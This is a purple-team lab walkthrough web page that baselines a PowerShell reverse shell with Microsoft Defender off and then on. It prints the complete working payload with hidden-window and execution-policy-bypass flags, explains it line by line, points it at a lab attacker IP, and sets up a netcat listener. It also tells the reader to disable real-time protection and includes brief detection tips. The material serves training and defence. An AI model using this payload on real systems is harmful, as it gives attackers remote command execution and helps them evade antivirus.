---
layout: default
title: "Walkthrough PowerShell Reverse Shell Without Defen"
permalink: /solo-purple-teaming/walkthrough-powershell-reverse-shell-without-defen/
---
<link rel="stylesheet" href="/assets/css/solo-purple-teaming.css">

<div class="spt-page">
<a class="spt-back" href="/solo-purple-teaming/">← Back to Solo Purple Teaming</a>
<section class="spt-hero">
<p class="spt-kicker">Solo Purple Teaming</p>
<h1>Walkthrough PowerShell Reverse Shell Without Defen</h1>
</section>
<section class="spt-content">
<h1
id="walkthrough-powershell-reverse-shell-without-defender">Walkthrough:
PowerShell Reverse Shell Without Defender</h1>
<h1 id="the-importance-of-baselining">The Importance of Baselining</h1>
<p><strong>Baselining</strong> is the process of establishing a clear
understanding of what constitutes normal behavior within a system or
environment. This methodology can be applied across various domains,
such as identifying typical process activity or standard patterns in
network traffic.</p>
<p>In the context of <strong>Solo Purple Teaming</strong>, baselining
plays a critical role for both attackers and defenders.</p>
<ul>
<li>For attackers, baselining an attack technique ensures a known-good
state. When issues arise, this baseline enables rapid troubleshooting,
efficient remediation, and ultimately successful execution.</li>
<li>For defenders, baselining helps define the normal operational state
of an environment. This foundation is essential for developing
high-fidelity detections that identify anomalies indicative of potential
threats.</li>
</ul>
<p>By understanding what “normal” looks like from both perspectives,
practitioners can enhance their offensive capabilities and strengthen
defensive posture.</p>
<h1
id="baselining-a-powershell-reverse-tcp-connection-without-defender-enabled">Baselining
a PowerShell Reverse TCP Connection Without Defender Enabled</h1>
<p>We will be using a payload from Payload All TheT hings. Please read
their disclaimer: <a
href="https://swisskyrepo.github.io/PayloadsAllTheThings/DISCLAIMER/">https://swisskyrepo.github.io/PayloadsAllTheThings/DISCLAIMER/</a></p>
<p>Payload Pulled From the Reverse Shell Cheat Sheet: <a
href="https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#openssl">https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#openssl</a></p>
<div class="sourceCode" id="cb1"><pre
class="sourceCode jsx"><code class="sourceCode javascriptreact"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a>powershell <span class="op">-</span>NoP <span class="op">-</span>NonI <span class="op">-</span>W Hidden <span class="op">-</span>Exec Bypass <span class="op">-</span>Command New<span class="op">-</span><span class="bu">Object</span> System<span class="op">.</span><span class="at">Net</span><span class="op">.</span><span class="at">Sockets</span><span class="op">.</span><span class="fu">TCPClient</span>(<span class="st">"10.0.0.1"</span><span class="op">,</span><span class="dv">4242</span>)<span class="op">;</span>$stream <span class="op">=</span> $client<span class="op">.</span><span class="fu">GetStream</span>()<span class="op">;</span>[byte[]]$bytes <span class="op">=</span> <span class="fl">0.</span><span class="op">.</span><span class="dv">65535</span><span class="op">|%</span>{<span class="dv">0</span>}<span class="op">;</span><span class="cf">while</span>(($i <span class="op">=</span> $stream<span class="op">.</span><span class="fu">Read</span>($bytes<span class="op">,</span> <span class="dv">0</span><span class="op">,</span> $bytes<span class="op">.</span><span class="at">Length</span>)) <span class="op">-</span>ne <span class="dv">0</span>){<span class="op">;</span>$data <span class="op">=</span> (New<span class="op">-</span><span class="bu">Object</span> <span class="op">-</span>TypeName System<span class="op">.</span><span class="at">Text</span><span class="op">.</span><span class="at">ASCIIEncoding</span>)<span class="op">.</span><span class="fu">GetString</span>($bytes<span class="op">,</span><span class="dv">0</span><span class="op">,</span> $i)<span class="op">;</span>$sendback <span class="op">=</span> (iex $data <span class="dv">2</span><span class="op">>&amp;</span><span class="dv">1</span> <span class="op">|</span> Out<span class="op">-</span><span class="bu">String</span> )<span class="op">;</span>$sendback2  <span class="op">=</span> $sendback <span class="op">+</span> <span class="st">"PS "</span> <span class="op">+</span> (pwd)<span class="op">.</span><span class="at">Path</span> <span class="op">+</span> <span class="st">"> "</span><span class="op">;</span>$sendbyte <span class="op">=</span> ([text<span class="op">.</span><span class="at">encoding</span>]<span class="op">::</span>ASCII)<span class="op">.</span><span class="fu">GetBytes</span>($sendback2)<span class="op">;</span>$stream<span class="op">.</span><span class="fu">Write</span>($sendbyte<span class="op">,</span><span class="dv">0</span><span class="op">,</span>$sendbyte<span class="op">.</span><span class="at">Length</span>)<span class="op">;</span>$stream<span class="op">.</span><span class="fu">Flush</span>()}<span class="op">;</span>$client<span class="op">.</span><span class="fu">Close</span>()</span></code></pre></div>
<p>Before you run any code in your lab, you should audit the code to
understand what it does. This payload is pretty self explanatory, but
let’s walk through it line by lin</p>
<p>This PowerShell payload is a <strong>reverse shell</strong>, meaning
it connects back from the victim's machine to a remote
attacker-controlled host and gives the attacker command-line access.
Let’s break it down step by step.</p>
<hr />
<h3 id="full-payload"><strong>Full Payload</strong></h3>
<div class="sourceCode" id="cb2"><pre
class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a>powershell <span class="op">-</span>NoP <span class="op">-</span>NonI <span class="op">-</span>W Hidden <span class="op">-</span>Exec Bypass <span class="op">-</span>Command</span>
<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="fu">New-Object</span> System<span class="op">.</span><span class="fu">Net</span><span class="op">.</span><span class="fu">Sockets</span><span class="op">.</span><span class="fu">TCPClient</span><span class="op">(</span><span class="st">"10.0.0.1"</span><span class="op">,</span><span class="dv">4242</span><span class="op">);</span></span>
<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a><span class="va">$stream</span> <span class="op">=</span> <span class="va">$client</span><span class="op">.</span><span class="fu">GetStream</span><span class="op">();</span></span>
<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a><span class="op">[</span><span class="dt">byte</span><span class="op">[]]</span><span class="va">$bytes</span> <span class="op">=</span> <span class="dv">0</span><span class="op">..</span><span class="dv">65535</span><span class="op">|%{</span><span class="dv">0</span><span class="op">};</span></span>
<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a><span class="cf">while</span><span class="op">((</span><span class="va">$i</span> <span class="op">=</span> <span class="va">$stream</span><span class="op">.</span><span class="fu">Read</span><span class="op">(</span><span class="va">$bytes</span><span class="op">,</span> <span class="dv">0</span><span class="op">,</span> <span class="va">$bytes</span><span class="op">.</span><span class="fu">Length</span><span class="op">))</span> <span class="op">-ne</span> <span class="dv">0</span><span class="op">){</span></span>
<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a>    <span class="va">$data</span> <span class="op">=</span> <span class="op">(</span><span class="fu">New-Object</span> <span class="op">-</span>TypeName System<span class="op">.</span><span class="fu">Text</span><span class="op">.</span><span class="fu">ASCIIEncoding</span><span class="op">).</span><span class="fu">GetString</span><span class="op">(</span><span class="va">$bytes</span><span class="op">,</span><span class="dv">0</span><span class="op">,</span> <span class="va">$i</span><span class="op">);</span></span>
<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a>    <span class="va">$sendback</span> <span class="op">=</span> <span class="op">(</span><span class="fu">iex</span> <span class="va">$data</span> <span class="dv">2</span><span class="op">>&amp;</span><span class="dv">1</span> <span class="op">|</span> <span class="fu">Out-String</span> <span class="op">);</span></span>
<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a>    <span class="va">$sendback2</span>  <span class="op">=</span> <span class="va">$sendback</span> <span class="op">+</span> <span class="st">"PS "</span> <span class="op">+</span> <span class="op">(</span><span class="fu">pwd</span><span class="op">).</span><span class="fu">Path</span> <span class="op">+</span> <span class="st">"> "</span><span class="op">;</span></span>
<span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a>    <span class="va">$sendbyte</span> <span class="op">=</span> <span class="op">([</span>text<span class="op">.</span><span class="fu">encoding</span><span class="op">]::</span>ASCII<span class="op">).</span><span class="fu">GetBytes</span><span class="op">(</span><span class="va">$sendback2</span><span class="op">);</span></span>
<span id="cb2-10"><a href="#cb2-10" aria-hidden="true" tabindex="-1"></a>    <span class="va">$stream</span><span class="op">.</span><span class="fu">Write</span><span class="op">(</span><span class="va">$sendbyte</span><span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="va">$sendbyte</span><span class="op">.</span><span class="fu">Length</span><span class="op">);</span></span>
<span id="cb2-11"><a href="#cb2-11" aria-hidden="true" tabindex="-1"></a>    <span class="va">$stream</span><span class="op">.</span><span class="fu">Flush</span><span class="op">()</span></span>
<span id="cb2-12"><a href="#cb2-12" aria-hidden="true" tabindex="-1"></a><span class="op">};</span></span>
<span id="cb2-13"><a href="#cb2-13" aria-hidden="true" tabindex="-1"></a><span class="va">$client</span><span class="op">.</span><span class="fu">Close</span><span class="op">()</span></span></code></pre></div>
<hr />
<h3 id="execution-flags-first-line"><strong>Execution Flags (First
Line)</strong></h3>
<div class="sourceCode" id="cb3"><pre
class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a>powershell <span class="op">-</span>NoP <span class="op">-</span>NonI <span class="op">-</span>W Hidden <span class="op">-</span>Exec Bypass <span class="op">-</span>Command <span class="op">...</span></span></code></pre></div>
<ul>
<li><code>NoP</code>: No profile – don’t load the user’s PowerShell
profile.</li>
<li><code>NonI</code>: Non-interactive – run without an interactive
shell.</li>
<li><code>W Hidden</code>: Window hidden – no visible window.</li>
<li><code>Exec Bypass</code>: Bypass execution policy – allows the
script to run even if it's blocked by policy.</li>
<li><code>Command</code>: Indicates a command or script follows.</li>
</ul>
<p>These options help evade detection and run the command silently.</p>
<hr />
<h3 id="main-logic-breakdown"><strong>Main Logic Breakdown</strong></h3>
<ol type="1">
<li><p><strong>Create a TCP client:</strong></p>
<div class="sourceCode" id="cb4"><pre
class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="fu">New-Object</span> System<span class="op">.</span><span class="fu">Net</span><span class="op">.</span><span class="fu">Sockets</span><span class="op">.</span><span class="fu">TCPClient</span><span class="op">(</span><span class="st">"10.0.0.1"</span><span class="op">,</span><span class="dv">4242</span><span class="op">)</span></span></code></pre></div>
<ul>
<li>Connects to the attacker’s IP address (<code>10.0.0.1</code>) on
port <code>4242</code>.</li>
<li>This machine must be listening with something like Netcat
(<code>nc -lvnp 4242</code>).</li>
</ul></li>
<li><p><strong>Set up stream for communication:</strong></p>
<div class="sourceCode" id="cb5"><pre
class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="va">$stream</span> <span class="op">=</span> <span class="va">$client</span><span class="op">.</span><span class="fu">GetStream</span><span class="op">()</span></span>
<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="op">[</span><span class="dt">byte</span><span class="op">[]]</span><span class="va">$bytes</span> <span class="op">=</span> <span class="dv">0</span><span class="op">..</span><span class="dv">65535</span><span class="op">|%{</span><span class="dv">0</span><span class="op">}</span></span></code></pre></div>
<ul>
<li><code>$stream</code> is the TCP stream for sending/receiving
data.</li>
<li><code>$bytes</code> is a buffer initialized to hold up to 65,536
bytes (standard max size for simplicity).</li>
</ul></li>
<li><p><strong>Loop to handle incoming commands:</strong></p>
<div class="sourceCode" id="cb6"><pre
class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="cf">while</span><span class="op">((</span><span class="va">$i</span> <span class="op">=</span> <span class="va">$stream</span><span class="op">.</span><span class="fu">Read</span><span class="op">(</span><span class="va">$bytes</span><span class="op">,</span> <span class="dv">0</span><span class="op">,</span> <span class="va">$bytes</span><span class="op">.</span><span class="fu">Length</span><span class="op">))</span> <span class="op">-ne</span> <span class="dv">0</span><span class="op">){</span></span>
<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a>    <span class="op">...</span></span>
<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<ul>
<li>Keeps reading data from the attacker.</li>
<li><code>$i</code> holds the number of bytes read.</li>
</ul></li>
<li><p><strong>Decode and execute the received command:</strong></p>
<div class="sourceCode" id="cb7"><pre
class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="va">$data</span> <span class="op">=</span> <span class="op">(</span><span class="fu">New-Object</span> <span class="op">-</span>TypeName System<span class="op">.</span><span class="fu">Text</span><span class="op">.</span><span class="fu">ASCIIEncoding</span><span class="op">).</span><span class="fu">GetString</span><span class="op">(</span><span class="va">$bytes</span><span class="op">,</span><span class="dv">0</span><span class="op">,</span> <span class="va">$i</span><span class="op">)</span></span>
<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="va">$sendback</span> <span class="op">=</span> <span class="op">(</span><span class="fu">iex</span> <span class="va">$data</span> <span class="dv">2</span><span class="op">>&amp;</span><span class="dv">1</span> <span class="op">|</span> <span class="fu">Out-String</span> <span class="op">)</span></span></code></pre></div>
<ul>
<li>Converts bytes into a string.</li>
<li>Executes it using <code>iex</code> (Invoke-Expression), which is
essentially like <code>eval</code>.</li>
<li>Captures output and errors as a string.</li>
</ul></li>
<li><p><strong>Format and send the response back:</strong></p>
<div class="sourceCode" id="cb8"><pre
class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="va">$sendback2</span> <span class="op">=</span> <span class="va">$sendback</span> <span class="op">+</span> <span class="st">"PS "</span> <span class="op">+</span> <span class="op">(</span><span class="fu">pwd</span><span class="op">).</span><span class="fu">Path</span> <span class="op">+</span> <span class="st">"> "</span></span>
<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="va">$sendbyte</span> <span class="op">=</span> <span class="op">([</span>text<span class="op">.</span><span class="fu">encoding</span><span class="op">]::</span>ASCII<span class="op">).</span><span class="fu">GetBytes</span><span class="op">(</span><span class="va">$sendback2</span><span class="op">)</span></span>
<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a><span class="va">$stream</span><span class="op">.</span><span class="fu">Write</span><span class="op">(</span><span class="va">$sendbyte</span><span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="va">$sendbyte</span><span class="op">.</span><span class="fu">Length</span><span class="op">)</span></span>
<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a><span class="va">$stream</span><span class="op">.</span><span class="fu">Flush</span><span class="op">()</span></span></code></pre></div>
<ul>
<li>Adds a PowerShell prompt to simulate a real shell.</li>
<li>Sends the response back to the attacker.</li>
</ul></li>
<li><p><strong>Close connection when done:</strong></p>
<div class="sourceCode" id="cb9"><pre
class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="va">$client</span><span class="op">.</span><span class="fu">Close</span><span class="op">()</span></span></code></pre></div></li>
</ol>
<hr />
<h3 id="summary"><strong>Summary</strong></h3>
<p>This is a <strong>reverse shell payload</strong> written in
PowerShell. It:</p>
<ul>
<li>Connects to an attacker's machine</li>
<li>Waits for commands</li>
<li>Executes them on the victim system</li>
<li>Sends output back over the network</li>
</ul>
<h3 id="redblue-team-notes"><strong>Red/Blue Team Notes</strong></h3>
<ul>
<li><strong>Red teamers</strong> use it to gain remote command
execution.</li>
<li><strong>Blue teamers</strong> can detect it by:
<ul>
<li>Monitoring PowerShell logging (especially
for <code>iex</code>, <code>TCPClient</code>)</li>
<li>Watching for outbound connections to unusual IPs/ports</li>
<li>Looking for use
of <code>Exec Bypass</code>, <code>W Hidden</code> in process command
lines</li>
</ul></li>
</ul>
<h2 id="modify-payload-for-lab-environment">Modify Payload for Lab
Environment</h2>
<p>My attacker host is at IP 10.0.3.2 so I am going to change the
TCPClient to connect to my attacker host IP address and go ahead and use
port 4242:</p>
<div class="sourceCode" id="cb10"><pre
class="sourceCode jsx"><code class="sourceCode javascriptreact"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a>New<span class="op">-</span><span class="bu">Object</span> System<span class="op">.</span><span class="at">Net</span><span class="op">.</span><span class="at">Sockets</span><span class="op">.</span><span class="fu">TCPClient</span>(<span class="st">"10.0.3.2"</span><span class="op">,</span><span class="dv">4242</span>)</span></code></pre></div>
<h2
id="make-sure-to-turn-off-realtime-protection-cloud-submissions-and-automatic-sample-submission">Make
Sure to Turn Off Realtime Protection, Cloud Submissions, and Automatic
Sample Submission</h2>
<p><img
src="/_assets/walkthrough-powershell-reverse-shell-without-defen/image.png"
alt="image.png" /></p>
<h2 id="setup-your-listener-using-netcat">Setup Your Listener Using
Netcat</h2>
<div class="sourceCode" id="cb11"><pre
class="sourceCode jsx"><code class="sourceCode javascriptreact"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a>nc <span class="op">-</span>nvlp <span class="dv">4242</span></span></code></pre></div>
<p><img
src="/_assets/walkthrough-powershell-reverse-shell-without-defen/image%201.png"
alt="image.png" /></p>
<h2 id="run-your-payload-using-powershell">Run Your Payload Using
PowerShell</h2>
<p><img
src="/_assets/walkthrough-powershell-reverse-shell-without-defen/image%202.png"
alt="image.png" /></p>
<h2 id="check-for-reverse-connection-on-attacker-kali-host">Check For
Reverse Connection on Attacker Kali Host</h2>
<p><img
src="/_assets/walkthrough-powershell-reverse-shell-without-defen/image%203.png"
alt="image.png" /></p>
<h2 id="test-command-execution">Test Command Execution</h2>
<p><img
src="/_assets/walkthrough-powershell-reverse-shell-without-defen/image%204.png"
alt="image.png" /></p>
<h2 id="enable-realtime-protection-and-repeat-the-process">Enable
Realtime Protection and Repeat the Process</h2>
<p><img
src="/_assets/walkthrough-powershell-reverse-shell-without-defen/image%205.png"
alt="image.png" /></p>
<p><img
src="/_assets/walkthrough-powershell-reverse-shell-without-defen/image%206.png"
alt="image.png" /></p>
<h3
id="what-do-you-think-causes-the-this-script-contains-malicious-content-and-has-been-blocked-by-your-antivirus-software-message">What
do you think causes the “This script contains malicious content and has
been blocked by your antivirus software” message?</h3>
</section>
</div>
